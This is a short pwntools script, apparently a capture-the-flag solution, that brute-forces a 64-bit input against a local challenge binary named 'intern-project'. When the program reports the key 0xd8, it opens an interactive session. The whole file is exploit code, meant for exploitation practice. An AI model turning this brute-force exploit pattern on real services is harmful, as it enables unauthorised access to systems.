from pwn import *
context.log_level = 'error'
PROGNAME   = "src/intern-project"
REMOTEIP   = "127.0.0.1"
REMOTEPORT = 9005

for i in range(0, 0x10000):
    if args.REMOTE:
        p = remote(REMOTEIP, REMOTEPORT)
        elf = ELF(PROGNAME)
    else:
        p = process(PROGNAME)
        elf = p.elf
    p.sendlineafter(": ", p64(i)) 

    p.recvuntil("Key is 0x")
    key = int(p.recvline(), 16)

    if key == 0xd8:
        p.interactive()
        break
    else:
        print "Failed key is " + hex(key)
    p.close()

